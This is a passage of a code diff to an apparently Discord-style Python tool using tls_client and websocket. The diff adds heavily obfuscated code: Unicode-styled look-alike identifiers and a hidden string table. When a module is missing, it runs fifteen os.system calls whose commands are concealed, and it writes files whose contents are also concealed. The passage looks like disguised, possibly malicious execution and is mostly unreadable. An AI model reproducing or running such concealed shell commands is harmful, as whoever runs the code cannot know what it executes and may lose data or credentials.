𝗜𝘔[41]}{𝘭𝘤}{𝙉𝗠𝘔𝙈𝗡𝙡𝗹𝙈𝘔𝙡𝘔𝘔𝘕𝘭𝙄𝗠𝙄𝙄𝗡𝘔𝘐𝗜𝗠𝘐𝙡𝘐𝘕𝙄𝗠𝗜𝙄𝙈[50]}{𝙧}{𝙉𝙈𝙈𝗠𝙉𝗹𝙡𝘔𝗠𝙡𝗠𝙈𝗡𝘭𝗜𝙈𝙄𝗜𝘕𝗠𝘐𝗜𝘔𝗜𝗹𝘐𝘕𝙄𝙈𝘐𝗜𝙈[41]}{𝙡𝘤}{𝙉𝘔𝗠𝙈𝗡𝘭𝗹𝗠𝘔𝘭𝘔𝙈𝘕𝗹𝗜𝙈𝗜𝙄𝘕𝙈𝙄𝗜𝙈𝘐𝗹𝙄𝙉𝗜𝘔𝙄𝘐𝙈[51]}{𝘳}{𝘕𝗠𝙈𝘔𝗡𝘭𝗹𝙈𝙈𝗹𝙈𝗠𝙉𝙡𝗜𝗠𝙄𝙄𝗡𝘔𝘐𝙄𝗠𝗜𝘭𝙄𝘕𝘐𝙈𝗜𝗜𝙈[41]}{𝘭𝘤}{𝘕𝗠𝙈𝘔𝗡𝙡𝗹𝙈𝘔𝘭𝘔𝙈𝘕𝗹𝘐𝘔𝗜𝗜𝙉𝙈𝗜𝘐𝘔𝘐𝙡𝙄𝘕𝘐𝗠𝘐𝙄𝘔[49]}{𝙧}{𝘕𝘔𝗠𝘔𝗡𝙡𝙡𝙈𝘔𝘭𝘔𝘔𝘕𝗹𝙄𝗠𝘐𝘐𝗡𝙈𝘐𝘐𝗠𝗜𝙡𝙄𝙉𝗜𝗠𝙄𝙄𝗠[41]}{𝙡𝗰}{𝙉𝗠𝙈𝗠𝘕𝙡𝘭𝗠𝙈𝗹𝗠𝙈𝘕𝘭𝘐𝙈𝙄𝙄𝘕𝗠𝙄𝙄𝙈𝙄𝙡𝙄𝘕𝙄𝙈𝙄𝗜𝗠[52]}{𝘳}{𝙉𝗠𝗠𝗠𝘕𝗹𝗹𝘔𝙈𝙡𝗠𝗠𝘕𝗹𝙄𝗠𝘐𝙄𝙉𝘔𝘐𝗜𝗠𝘐𝗹𝘐𝘕𝗜𝘔𝘐𝗜𝙈[41]}{𝘭𝘤}{𝗡𝗠𝙈𝘔𝘕𝘭𝙡𝗠𝙈𝗹𝘔𝙈𝘕𝘭𝘐𝗠𝙄𝗜𝗡𝘔𝙄𝘐𝗠𝗜𝘭𝘐𝗡𝘐𝗠𝙄𝙄𝙈[49]}{𝘳}{𝘕𝗠𝗠𝘔𝗡𝙡𝙡𝗠𝘔𝙡𝙈𝙈𝙉𝙡𝙄𝘔𝙄𝗜𝙉𝘔𝘐𝗜𝗠𝙄𝘭𝙄𝘕𝙄𝙈𝘐𝗜𝘔[53]}{𝘭𝗰}{𝙉𝙈𝘔𝗠𝗡𝘭𝙡𝘔𝘔𝗹𝙈𝗠𝙉𝗹𝗜𝘔𝗜𝘐𝙉𝙈𝗜𝘐𝘔𝙄𝗹𝙄𝘕𝘐𝘔𝙄𝙄𝙈[54]}{𝗿}{𝙉𝙈𝘔𝘔𝙉𝙡𝙡𝙈𝙈𝘭𝗠𝘔𝗡𝘭𝘐𝙈𝗜𝙄𝗡𝘔𝘐𝗜𝙈𝘐𝙡𝘐𝗡𝙄𝘔𝘐𝗜𝗠[53]}{𝘭𝙘}{𝙉𝗠𝘔𝗠𝙉𝙡𝙡𝘔𝗠𝙡𝙈𝗠𝙉𝙡𝗜𝙈𝘐𝘐𝙉𝘔𝙄𝘐𝘔𝗜𝘭𝘐𝘕𝙄𝗠𝗜𝘐𝙈[49]}{𝙧}{𝙉𝘔𝘔𝙈𝘕𝘭𝘭𝘔𝗠𝘭𝗠𝙈𝗡𝗹𝘐𝗠𝙄𝘐𝙉𝗠𝗜𝗜𝘔𝗜𝗹𝘐𝘕𝗜𝗠𝗜𝙄𝗠[55]}{𝗹𝘤}{𝙉𝗠𝘔𝙈𝙉𝗹𝘭𝗠𝙈𝗹𝗠𝘔𝘕𝘭𝙄𝙈𝘐𝙄𝗡𝙈𝙄𝙄𝗠𝗜𝗹𝘐𝙉𝗜𝙈𝘐𝘐𝗠[49]}{𝙧}{𝗡𝙈𝘔𝘔𝘕𝙡𝙡𝘔𝗠𝗹𝗠𝙈𝘕𝘭𝘐𝗠𝙄𝗜𝙉𝘔𝗜𝘐𝘔𝘐𝙡𝙄𝘕𝘐𝙈𝘐𝗜𝘔[56]}{𝘭𝘤}{𝘕𝘔𝗠𝙈𝙉𝘭𝙡𝗠𝙈𝘭𝗠𝗠𝙉𝙡𝘐𝗠𝙄𝗜𝙉𝗠𝗜𝙄𝗠𝗜𝘭𝙄𝘕𝙄𝙈𝗜𝗜𝗠[40]}{𝗿}{𝗡𝗠𝙈𝗠𝗡𝗹𝙡𝙈𝘔𝗹𝙈𝘔𝗡𝙡𝙄𝙈𝙄𝘐𝙉𝗠𝙄𝗜𝘔𝙄𝙡𝘐𝘕𝙄𝘔𝘐𝗜𝗠[41]}{𝙡𝙘}{𝙉𝗠𝙈𝗠𝙉𝙡𝗹𝘔𝙈𝘭𝘔𝘔𝗡𝗹𝙄𝗠𝘐𝘐𝙉𝗠𝗜𝘐𝗠𝘐𝗹𝙄𝘕𝙄𝙈𝙄𝗜𝗠[51]}{𝗿}{𝘕𝘔𝙈𝙈𝗡𝗹𝘭𝗠𝘔𝙡𝗠𝘔𝘕𝘭𝗜𝙈𝗜𝘐𝗡𝙈𝘐𝗜𝘔𝙄𝘭𝗜𝘕𝘐𝘔𝗜𝙄𝙈[41]}{𝘭𝘤}{𝙉𝘔𝙈𝗠𝙉𝙡𝗹𝙈𝗠𝗹𝘔𝗠𝗡𝙡𝗜𝙈𝗜𝗜𝘕𝘔𝘐𝗜𝗠𝙄𝙡𝘐𝘕𝗜𝙈𝘐𝗜𝘔[49]}{𝗿}{𝗡𝗠𝘔𝙈𝘕𝗹𝙡𝙈𝙈𝙡𝙈𝙈𝗡𝙡𝙄𝙈𝙄𝙄𝘕𝘔𝘐𝗜𝙈𝙄𝘭𝙄𝙉𝘐𝙈𝙄𝙄𝙈[41]}{𝗹𝙘}{𝙉𝙈𝘔𝗠𝗡𝗹𝙡𝗠𝗠𝗹𝙈𝗠𝘕𝘭𝙄𝙈𝙄𝙄𝙉𝘔𝘐𝗜𝗠𝘐𝙡𝗜𝘕𝗜𝘔𝗜𝗜𝗠[52]}{𝙧}{𝘕𝘔𝙈𝗠𝗡𝗹𝘭𝙈𝙈𝗹𝗠𝘔𝗡𝘭𝘐𝘔𝘐𝘐𝗡𝘔𝙄𝙄𝘔𝘐𝙡𝗜𝘕𝗜𝙈𝘐𝙄𝘔[41]}{𝘭𝘤}{𝗡𝗠𝙈𝙈𝙉𝗹𝘭𝗠𝙈𝘭𝘔𝙈𝙉𝙡𝗜𝗠𝘐𝘐𝗡𝘔𝗜𝗜𝘔𝘐𝙡𝙄𝗡𝗜𝗠𝘐𝙄𝘔[49]}{𝘳}{𝗡𝘔𝘔𝗠𝘕𝗹𝗹𝙈𝘔𝙡𝘔𝙈𝗡𝙡𝙄𝗠𝘐𝙄𝗡𝗠𝗜𝙄𝘔𝘐𝗹𝙄𝗡𝗜𝙈𝙄𝙄𝗠[41]}{𝗹𝘤}{𝘕𝗠𝙈𝘔𝗡𝘭𝘭𝘔𝙈𝘭𝙈𝙈𝘕𝘭𝘐𝙈𝘐𝙄𝘕𝘔𝗜𝘐𝗠𝙄𝘭𝗜𝘕𝙄𝗠𝙄𝗜𝗠[57]}{𝘳}{𝗡𝙈𝗠𝘔𝘕𝘭𝘭𝙈𝙈𝘭𝙈𝘔𝗡𝘭𝙄𝙈𝙄𝗜𝗡𝘔𝙄𝗜𝗠𝗜𝙡𝙄𝗡𝗜𝙈𝘐𝘐𝘔[53]}{𝗹𝘤}{𝙉𝗠𝙈𝗠𝘕𝙡𝘭𝗠𝙈𝙡𝙈𝗠𝗡𝗹𝗜𝙈𝙄𝘐𝙉𝘔𝗜𝗜𝙈𝗜𝙡𝗜𝘕𝗜𝘔𝙄𝗜𝙈[57]}{𝗿}{𝗡𝙈𝘔𝙈𝗡𝗹𝘭𝘔𝗠𝘭𝘔𝘔𝙉𝙡𝗜𝗠𝙄𝙄𝙉𝙈𝘐𝙄𝘔𝘐𝗹𝘐𝘕𝘐𝗠𝗜𝘐𝙈[41]}{𝙡𝘤}{𝘕𝘔𝗠𝘔𝙉𝙡𝗹𝗠𝘔𝙡𝘔𝙈𝘕𝗹𝘐𝘔𝘐𝘐𝙉𝘔𝙄𝗜𝘔𝘐𝙡𝘐𝘕𝗜𝙈𝙄𝘐𝘔[49]}{𝗿}{𝗡𝗠𝗠𝗠𝙉𝙡𝗹𝗠𝘔𝘭𝙈𝗠𝙉𝗹𝙄𝘔𝘐𝘐𝘕𝗠𝗜𝘐𝗠𝙄𝘭𝗜𝗡𝗜𝘔𝙄𝗜𝘔[58]}{𝙡𝘤}{𝘕𝗠𝘔𝘔𝘕𝗹𝗹𝘔𝗠𝘭𝙈𝗠𝘕𝙡𝘐𝙈𝙄𝙄𝘕𝗠𝘐𝙄𝗠𝙄𝙡𝙄𝗡𝙄𝘔𝘐𝘐𝘔[59]}{𝗿}{𝗡𝗠𝘔𝗠𝙉𝘭𝘭𝘔𝘔𝘭𝗠𝘔𝘕𝗹𝘐𝘔𝗜𝘐𝘕𝘔𝘐𝙄𝗠𝘐𝗹𝙄𝙉𝙄𝙈𝙄𝙄𝘔[41]}{𝗹𝘤}{𝗡𝙈𝗠𝘔𝗡𝘭𝘭𝗠𝘔𝘭𝙈𝗠𝘕𝘭𝙄𝗠𝙄𝘐𝙉𝗠𝙄𝘐𝙈𝙄𝗹𝘐𝙉𝗜𝗠𝙄𝘐𝘔[49]}{𝗿}{𝙉𝘔𝙈𝙈𝗡𝘭𝘭𝘔𝘔𝘭𝘔𝗠𝙉𝙡𝗜𝗠𝙄𝗜𝙉𝘔𝘐𝘐𝗠𝗜𝙡𝙄𝘕𝙄𝘔𝙄𝗜𝗠[41]}{𝘭𝙘}{𝗡𝘔𝘔𝘔𝙉𝙡𝘭𝘔𝙈𝗹𝙈𝙈𝙉𝘭𝙄𝘔𝘐𝗜𝙉𝙈𝗜𝙄𝗠𝘐𝗹𝘐𝘕𝘐𝘔𝗜𝗜𝘔[60]}{𝗿}{𝙉𝘔𝙈𝗠𝘕𝙡𝗹𝘔𝙈𝗹𝙈𝙈𝗡𝙡𝘐𝘔𝙄𝙄𝘕𝙈𝙄𝘐𝙈𝙄𝙡𝘐𝘕𝘐𝘔𝘐𝗜𝙈[41]}{𝗹𝘤}{𝙉𝘔𝙈𝘔𝘕𝗹𝗹𝙈𝘔𝙡𝗠𝙈𝘕𝘭𝙄𝘔𝗜𝙄𝗡𝘔𝘐𝘐𝘔𝙄𝗹𝗜𝘕𝗜𝙈𝗜𝗜𝙈[51]}{𝘳}{𝗡𝗠𝗠𝙈𝘕𝗹𝘭𝙈𝙈𝘭𝗠𝙈𝗡𝗹𝗜𝙈𝘐𝗜𝗡𝘔𝘐𝗜𝗠𝙄𝗹𝘐𝘕𝗜𝙈𝗜𝗜𝗠[41]}{𝗹𝙘}{𝘕𝘔𝗠𝘔𝙉𝙡𝘭𝙈𝗠𝗹𝙈𝗠𝗡𝗹𝙄𝘔𝙄𝗜𝘕𝙈𝗜𝗜𝙈𝗜𝗹𝙄𝙉𝘐𝗠𝗜𝗜𝘔[49]}{𝙧}{𝗡𝗠𝙈𝗠𝙉𝙡𝗹𝙈𝘔𝘭𝘔𝗠𝗡𝙡𝙄𝙈𝗜𝙄𝙉𝘔𝘐𝙄𝗠𝙄𝘭𝗜𝗡𝙄𝙈𝙄𝗜𝗠[41]}{𝙡𝗰}{𝗡𝗠𝙈𝗠𝗡𝙡𝘭𝘔𝘔𝗹𝘔𝗠𝘕𝙡𝘐𝗠𝙄𝙄𝘕𝙈𝙄𝘐𝗠𝙄𝗹𝙄𝘕𝘐𝗠𝗜𝘐𝘔[52]}{𝘳}{𝗡𝙈𝗠𝘔𝙉𝗹𝗹𝙈𝘔𝙡𝙈𝘔𝘕𝘭𝘐𝘔𝙄𝘐𝗡𝗠𝘐𝗜𝗠𝗜𝗹𝘐𝗡𝗜𝙈𝗜𝙄𝙈[41]}{𝙡𝗰}{𝘕𝘔𝙈𝙈𝙉𝘭𝙡𝗠𝗠𝗹𝘔𝙈𝘕𝘭𝘐𝘔𝙄𝘐𝗡𝙈𝙄𝘐𝗠𝙄𝘭𝘐𝙉𝘐𝙈𝗜𝘐𝗠[49]}{𝘳}{𝘕𝗠𝙈𝗠𝗡𝗹𝗹𝘔𝙈𝗹𝙈𝗠𝘕𝗹𝘐𝗠𝙄𝘐𝘕𝙈𝘐𝗜𝘔𝙄𝗹𝙄𝙉𝙄𝘔𝘐𝘐𝗠[41]}{𝗹𝗰}{𝗡𝙈𝗠𝙈𝙉𝙡𝗹𝙈𝘔𝘭𝗠𝗠𝙉𝙡𝘐𝘔𝙄𝙄𝘕𝗠𝙄𝘐𝙈𝘐𝘭𝘐𝗡𝗜𝘔𝙄𝘐𝗠[61]}{𝘳}{𝗡𝙈𝘔𝘔𝘕𝗹𝘭𝘔𝙈𝗹𝙈𝘔𝘕𝗹𝗜𝗠𝘐𝘐𝙉𝗠𝗜𝙄𝙈𝗜𝘭𝘐𝗡𝘐𝗠𝗜𝗜𝙈[41]}{𝘭𝙘}{𝗡𝘔𝙈𝗠𝗡𝘭𝗹𝘔𝘔𝙡𝘔𝗠𝙉𝗹𝘐𝙈𝘐𝗜𝘕𝘔𝙄𝘐𝘔𝘐𝘭𝘐𝙉𝗜𝙈𝙄𝗜𝘔[62]}{𝙧}{𝘕𝘔𝘔𝙈𝘕𝗹𝘭𝗠𝗠𝙡𝙈𝘔𝙉𝘭𝘐𝘔𝘐𝗜𝙉𝗠𝘐𝘐𝙈𝘐𝘭𝗜𝘕𝘐𝘔𝗜𝘐𝙈[41]}{𝘭𝘤}{𝙉𝘔𝙈𝗠𝙉𝗹𝗹𝙈𝙈𝘭𝗠𝙈𝙉𝗹𝗜𝙈𝙄𝗜𝙉𝗠𝗜𝙄𝘔𝙄𝘭𝙄𝘕𝙄𝗠𝗜𝙄𝙈[49]}{𝘳}{𝗡𝗠𝙈𝘔𝗡𝗹𝙡𝗠𝗠𝘭𝙈𝘔𝙉𝘭𝘐𝙈𝗜𝘐𝗡𝙈𝘐𝙄𝘔𝗜𝗹𝗜𝙉𝘐𝗠𝙄𝗜𝙈[58]}{𝘭𝘤}{𝗡𝘔𝙈𝗠𝘕𝘭𝙡𝙈𝘔𝗹𝗠𝗠𝙉𝘭𝗜𝘔𝘐𝗜𝙉𝘔𝙄𝘐𝙈𝗜𝙡𝙄𝗡𝗜𝘔𝙄𝙄𝘔[48]}{𝙧}{𝗡𝗠𝙈𝙈𝙉𝗹𝘭𝘔𝗠𝗹𝘔𝗠𝙉𝙡𝗜𝙈𝗜𝘐𝘕𝘔𝗜𝗜𝗠𝘐𝙡𝙄𝗡𝗜𝗠𝙄𝗜𝙈[41]}{𝘭𝘤}{𝗡𝙈𝘔𝘔𝗡𝗹𝗹𝘔𝘔𝘭𝙈𝘔𝙉𝘭𝗜𝙈𝗜𝙄𝙉𝙈𝗜𝘐𝘔𝗜𝙡𝘐𝗡𝗜𝙈𝗜𝙄𝙈[49]}{𝗿}{𝗡𝘔𝗠𝗠𝙉𝙡𝘭𝘔𝘔𝙡𝗠𝗠𝗡𝙡𝗜𝙈𝙄𝙄𝘕𝗠𝙄𝘐𝗠𝙄𝙡𝙄𝗡𝙄𝙈𝗜𝙄𝗠[43]}{𝙡𝙘}{𝘕𝙈𝗠𝗠𝗡𝙡𝘭𝙈𝘔𝘭𝘔𝘔𝗡𝗹𝙄𝘔𝗜𝘐𝗡𝗠𝘐𝙄𝗠𝙄𝗹𝙄𝗡𝗜𝗠𝙄𝙄𝗠[42]}{𝗿}{𝘕𝘔𝘔𝗠𝗡𝙡𝙡𝗠𝙈𝗹𝘔𝗠𝙉𝘭𝗜𝘔𝘐𝙄𝗡𝗠𝙄𝘐𝙈𝗜𝙡𝙄𝙉𝙄𝘔𝗜𝙄𝙈[43]}{𝘭𝙘}{𝙉𝘔𝗠𝗠𝘕𝙡𝘭𝙈𝙈𝘭𝘔𝘔𝙉𝙡𝗜𝙈𝗜𝘐𝙉𝘔𝘐𝗜𝗠𝘐𝙡𝙄𝙉𝘐𝗠𝙄𝗜𝗠[42]}{𝙧}{𝗡𝙈𝘔𝗠𝗡𝙡𝘭𝗠𝙈𝙡𝙈𝘔𝗡𝘭𝘐𝗠𝗜𝙄𝘕𝙈𝘐𝗜𝘔𝙄𝙡𝙄𝙉𝗜𝘔𝘐𝗜𝗠[41]}{𝘭𝗰}{𝘕𝗠𝘔𝗠𝗡𝙡𝘭𝙈𝙈𝗹𝗠𝙈𝗡𝘭𝗜𝗠𝗜𝗜𝘕𝗠𝘐𝘐𝘔𝙄𝘭𝘐𝙉𝘐𝘔𝘐𝙄𝗠[61]}{𝙧}{𝙉𝘔𝙈𝙈𝘕𝙡𝙡𝘔𝗠𝗹𝗠𝗠𝙉𝗹𝘐𝘔𝗜𝗜𝗡𝘔𝘐𝗜𝗠𝘐𝙡𝗜𝘕𝗜𝙈𝗜𝘐𝗠[63]}{𝘭𝘤}{𝘕𝗠𝗠𝗠𝙉𝗹𝘭𝗠𝘔𝘭𝙈𝗠𝘕𝗹𝘐𝙈𝘐𝗜𝗡𝘔𝙄𝗜𝗠𝗜𝗹𝙄𝗡𝗜𝙈𝘐𝘐𝙈[62]}{𝘳}{𝙉𝘔𝘔𝘔𝙉𝙡𝘭𝙈𝙈𝗹𝙈𝗠𝘕𝙡𝘐𝘔𝘐𝘐𝘕𝗠𝘐𝗜𝗠𝙄𝘭𝘐𝘕𝘐𝘔𝙄𝘐𝙈[41]}{𝗹𝗰}{𝙉𝘔𝙈𝘔𝗡𝘭𝘭𝙈𝙈𝗹𝙈𝗠𝗡𝙡𝘐𝘔𝗜𝗜𝗡𝙈𝘐𝘐𝘔𝗜𝗹𝘐𝙉𝘐𝗠𝗜𝙄𝙈[64]}{𝙧}{𝗡𝘔𝙈𝙈𝙉𝘭𝙡𝘔𝙈𝙡𝘔𝙈𝗡𝘭𝗜𝗠𝘐𝗜𝗡𝗠𝙄𝙄𝗠𝘐𝘭𝙄𝗡𝙄𝙈𝗜𝙄𝗠[41]}{𝘭𝙘}{𝘕𝘔𝘔𝗠𝙉𝘭𝘭𝗠𝗠𝘭𝗠𝙈𝙉𝙡𝗜𝙈𝘐𝙄𝘕𝘔𝗜𝙄𝙈𝙄𝘭𝗜𝙉𝘐𝗠𝙄𝙄𝙈[65]}'
-with 𝘰𝗽𝙚𝘯(𝙉𝗠𝗠𝘔𝘕𝙡𝘭𝙈𝘔𝗹𝙈𝙈𝗡𝗹𝙄𝘔𝙄𝘐𝘕𝗠𝗜𝗜𝘔𝙄𝘭𝙄𝘕𝗜𝗠𝘐𝙄𝘔[66], 𝘕𝙈𝙈𝘔𝙉𝘭𝗹𝗠𝗠𝗹𝙈𝙈𝗡𝘭𝗜𝘔𝙄𝘐𝗡𝘔𝘐𝗜𝙈𝘐𝙡𝗜𝗡𝗜𝙈𝙄𝗜𝗠[37]) as 𝘧:
-    𝘵𝙤𝙠𝘦𝙣𝘴 = 𝗳.read().splitlines()
+except 𝙈𝙤𝙙𝘂𝙡𝙚𝗡𝘰𝘵𝗙𝙤𝙪𝗻𝙙𝙀𝗿𝘳𝗼𝘳:
+    𝗼𝙨.system(𝙄𝙉𝗜𝙉𝙡𝙡𝗜𝗠𝗜𝗜𝗹𝗠𝗹𝙡𝙄𝙡𝘭𝘕𝙉𝙄𝘭𝗹𝗠𝘕𝙡𝗡𝘭𝘔𝙄𝗠𝙄𝙈[2])
+    𝙤𝘴.system(𝗜𝘕𝙄𝗡𝙡𝗹𝘐𝘔𝗜𝙄𝘭𝙈𝘭𝗹𝗜𝗹𝗹𝙉𝙉𝘐𝗹𝗹𝘔𝙉𝗹𝘕𝗹𝙈𝙄𝙈𝙄𝙈[3])
+    𝘰𝙨.system(𝗜𝙉𝙄𝘕𝙡𝗹𝘐𝗠𝙄𝘐𝘭𝙈𝘭𝗹𝙄𝗹𝗹𝘕𝙉𝗜𝘭𝘭𝘔𝙉𝗹𝗡𝗹𝗠𝙄𝘔𝗜𝗠[4])
+    𝙤𝘀.system(𝘐𝙉𝘐𝘕𝘭𝘭𝙄𝙈𝘐𝘐𝗹𝗠𝘭𝘭𝘐𝗹𝘭𝘕𝗡𝘐𝘭𝗹𝗠𝗡𝙡𝗡𝙡𝙈𝘐𝘔𝗜𝙈[5])
+    𝘰𝘴.system(𝘐𝙉𝗜𝗡𝙡𝗹𝘐𝗠𝗜𝘐𝗹𝗠𝗹𝗹𝙄𝗹𝘭𝘕𝙉𝙄𝗹𝗹𝙈𝘕𝗹𝙉𝘭𝘔𝙄𝙈𝘐𝘔[6])
+    𝗼𝙨.system(𝗜𝘕𝘐𝘕𝘭𝙡𝙄𝘔𝘐𝘐𝙡𝗠𝙡𝙡𝙄𝗹𝙡𝗡𝙉𝘐𝗹𝙡𝙈𝙉𝙡𝘕𝗹𝙈𝘐𝗠𝙄𝙈[7])
+    𝗼𝙨.system(𝘐𝘕𝗜𝗡𝙡𝗹𝘐𝘔𝗜𝘐𝙡𝙈𝘭𝘭𝗜𝗹𝘭𝘕𝘕𝗜𝙡𝘭𝘔𝙉𝗹𝗡𝘭𝙈𝙄𝙈𝗜𝗠[8])
+    𝙤𝙨.system(𝗜𝗡𝙄𝗡𝗹𝘭𝙄𝗠𝗜𝙄𝗹𝘔𝙡𝘭𝘐𝙡𝘭𝙉𝗡𝗜𝘭𝙡𝘔𝗡𝙡𝘕𝙡𝙈𝘐𝙈𝘐𝙈[9])
+    𝘰𝘀.system(𝘐𝗡𝘐𝘕𝘭𝘭𝗜𝙈𝙄𝘐𝗹𝘔𝘭𝙡𝘐𝗹𝘭𝘕𝙉𝗜𝗹𝙡𝘔𝘕𝙡𝙉𝘭𝗠𝗜𝙈𝘐𝗠[10])
+    𝗼𝘀.system(𝗜𝗡𝙄𝘕𝙡𝘭𝘐𝗠𝙄𝘐𝗹𝘔𝘭𝙡𝗜𝙡𝘭𝗡𝘕𝙄𝗹𝙡𝙈𝗡𝗹𝙉𝙡𝗠𝗜𝗠𝙄𝘔[11])
+    𝗼𝘀.system(𝙄𝙉𝗜𝗡𝙡𝙡𝘐𝙈𝘐𝙄𝙡𝗠𝗹𝘭𝘐𝘭𝘭𝙉𝘕𝙄𝗹𝗹𝙈𝗡𝘭𝙉𝙡𝙈𝙄𝙈𝙄𝘔[12])
+    𝗼𝘀.system(𝙄𝙉𝙄𝙉𝗹𝙡𝘐𝘔𝘐𝘐𝘭𝗠𝘭𝙡𝘐𝘭𝘭𝘕𝗡𝙄𝙡𝙡𝗠𝘕𝘭𝗡𝗹𝘔𝗜𝙈𝗜𝗠[13])
+    𝘰𝘴.system(𝗜𝘕𝙄𝗡𝘭𝘭𝘐𝘔𝗜𝘐𝙡𝘔𝘭𝙡𝙄𝗹𝘭𝗡𝙉𝘐𝙡𝗹𝗠𝙉𝙡𝙉𝙡𝘔𝙄𝘔𝗜𝘔[14])
+    𝘰𝙨.system(𝘐𝘕𝗜𝗡𝘭𝘭𝘐𝙈𝘐𝘐𝗹𝘔𝙡𝙡𝘐𝗹𝙡𝗡𝘕𝙄𝘭𝙡𝗠𝘕𝘭𝗡𝘭𝗠𝙄𝗠𝗜𝙈[15])
+    𝙤𝘴.system(𝘐𝘕𝘐𝗡𝗹𝙡𝙄𝘔𝙄𝗜𝗹𝘔𝘭𝙡𝙄𝗹𝗹𝘕𝗡𝙄𝗹𝘭𝙈𝙉𝗹𝗡𝘭𝘔𝙄𝙈𝘐𝘔[16])
+    from colorama import Fore
+    from os.path import isfile, join
+    from pathlib import Path
+    from threading import Thread
+    from time import sleep
+    from tls_client import Session
+    from websocket import WebSocket
+    import base64
+    import colorama
+    import datetime
+    import hashlib
+    import json
+    import numpy as np
+    import random
+    import requests
+    import subprocess
+    import sys
+    import threading
+    import time
+    import tls_client
+    import uuid
+    import websocket
+    import emoji as ej
+𝘤𝗼𝘭𝗼𝘳𝘢𝗺𝗮.init()
+𝘀𝘥𝘪𝘳 = 𝙤𝙨.path.dirname(𝙤𝙨.path.abspath(__𝗳𝙞𝘭𝙚__))
+𝙙𝗮𝘵𝗮 = 𝗼𝘴.path.join(𝘀𝙙𝘪𝙧, 𝘐𝗡𝘐𝗡𝗹𝘭𝗜𝙈𝙄𝙄𝙡𝗠𝙡𝘭𝘐𝗹𝘭𝙉𝗡𝙄𝙡𝗹𝙈𝘕𝙡𝗡𝘭𝙈𝘐𝗠𝙄𝘔[17])
+𝗮𝘣𝗰 = 𝘰𝘴.path.dirname(𝙤𝘴.path.abspath(𝘥𝗮𝘵𝗮))
+𝗮𝙫𝙖𝘁𝘢𝘳𝙨 = 𝘰𝘀.path.join(𝙖𝗯𝘤, 𝘐𝘕𝙄𝗡𝘭𝙡𝘐𝗠𝘐𝙄𝙡𝙈𝘭𝙡𝙄𝙡𝘭𝙉𝗡𝘐𝘭𝙡𝙈𝗡𝙡𝗡𝙡𝙈𝘐𝘔𝗜𝘔[18])
+if not 𝘰𝘀.path.exists(𝙙𝗮𝙩𝗮):
+    𝘰𝘀.system(𝙄𝙉𝗜𝗡𝙡𝘭𝙄𝘔𝗜𝗜𝗹𝘔𝘭𝗹𝗜𝘭𝘭𝙉𝗡𝗜𝘭𝘭𝗠𝙉𝘭𝘕𝘭𝗠𝘐𝙈𝗜𝗠[19])
+    𝗼𝘴.makedirs(𝗱𝘢𝘵𝗮)
+    𝙤𝙨.makedirs(𝙖𝘃𝗮𝘵𝗮𝙧𝘀)
+    with 𝗼𝘱𝗲𝙣(𝗼𝘴.path.join(𝙙𝙖𝘵𝘢, 𝙄𝙉𝗜𝘕𝙡𝙡𝘐𝗠𝘐𝙄𝗹𝗠𝙡𝗹𝘐𝗹𝙡𝙉𝘕𝘐𝙡𝗹𝗠𝙉𝙡𝘕𝙡𝙈𝙄𝙈𝘐𝙈[20]), 𝘐𝙉𝙄𝙉𝙡𝗹𝘐𝙈𝙄𝘐𝘭𝙈𝙡𝙡𝙄𝙡𝗹𝙉𝘕𝘐𝗹𝘭𝘔𝗡𝗹𝘕𝙡𝘔𝘐𝙈𝗜𝘔[21]) as 𝘧:
+        𝘧.write(𝗜𝙉𝙄𝙉𝙡𝙡𝘐𝘔𝗜𝗜𝘭𝘔𝘭𝙡𝙄𝙡𝘭𝗡𝘕𝙄𝘭𝘭𝘔𝙉𝙡𝘕𝗹𝗠𝘐𝗠𝗜𝙈[22])
+    with 𝗼𝙥𝘦𝘯(𝘰𝘴.path.join(𝗱𝘢𝘁𝘢, 𝗜𝙉𝙄𝘕𝗹𝙡𝙄𝗠𝗜𝗜𝘭𝙈𝙡𝙡𝗜𝗹𝘭𝙉𝘕𝙄𝘭𝙡𝗠𝘕𝙡𝘕𝙡𝘔𝗜𝘔𝙄𝗠[23]), 𝗜𝘕𝗜𝙉𝗹𝗹𝗜𝗠𝘐𝘐𝙡𝙈𝗹𝘭𝙄𝘭𝗹𝙉𝘕𝘐𝙡𝙡𝗠𝗡𝘭𝘕𝘭𝗠𝘐𝙈𝗜𝗠[21]) as 𝙛:
+        𝗳.write(𝙄𝘕𝘐𝙉𝗹𝙡𝙄𝗠𝘐𝗜𝘭𝘔𝙡𝗹𝘐𝙡𝘭𝘕𝗡𝗜𝘭𝗹𝘔𝗡𝘭𝙉𝗹𝙈𝘐𝘔𝙄𝗠[22])
+    with 𝙤𝙥𝙚𝗻(𝗼𝙨.path.join(𝗱𝙖𝘵𝙖, 𝙄𝙉𝘐𝘕𝘭𝗹𝗜𝗠𝗜𝗜𝗹𝗠𝗹𝘭𝙄𝗹𝙡𝘕𝗡𝙄𝗹𝗹𝙈𝘕𝘭𝙉𝗹𝘔𝘐𝙈𝗜𝙈[24]), 𝗜𝗡𝘐𝗡𝙡𝘭𝙄𝘔𝗜𝗜𝘭𝘔𝗹𝗹𝗜𝗹𝘭𝙉𝘕𝘐𝙡𝘭𝗠𝗡𝗹𝗡𝗹𝘔𝘐𝙈𝗜𝙈[21]) as 𝗳:
+        𝙛.write(𝘐𝘕𝗜𝙉𝙡𝘭𝙄𝗠𝙄𝙄𝗹𝗠𝗹𝗹𝙄𝙡𝙡𝗡𝗡𝘐𝘭𝘭𝗠𝗡𝙡𝘕𝗹𝘔𝘐𝙈𝗜𝘔[22])
+𝙘𝙤𝘯𝗳𝗶𝙜𝙥 = 𝘰𝙨.path.join(𝘀𝘥𝘪𝘳, 𝘐𝘕𝗜𝘕𝙡𝗹𝙄𝘔𝗜𝗜𝙡𝙈𝗹𝘭𝘐𝙡𝗹𝘕𝗡𝙄𝘭𝗹𝗠𝙉𝗹𝙉𝗹𝘔𝙄𝘔𝘐𝘔[25])
+if not 𝙤𝘀.path.exists(𝘤𝗼𝗻𝗳𝗶𝗴𝗽):
+    with 𝘰𝗽𝙚𝗻(𝙤𝘴.path.join(𝘐𝗡𝗜𝘕𝗹𝗹𝗜𝗠𝘐𝘐𝗹𝙈𝙡𝗹𝗜𝙡𝙡𝗡𝙉𝗜𝗹𝗹𝗠𝘕𝘭𝗡𝗹𝙈𝙄𝗠𝘐𝘔[25]), 𝗜𝘕𝙄𝙉𝗹𝙡𝘐𝙈𝗜𝗜𝘭𝗠𝘭𝗹𝙄𝗹𝗹𝘕𝙉𝗜𝙡𝘭𝙈𝘕𝙡𝙉𝙡𝗠𝗜𝗠𝙄𝘔[21]) as 𝘧:
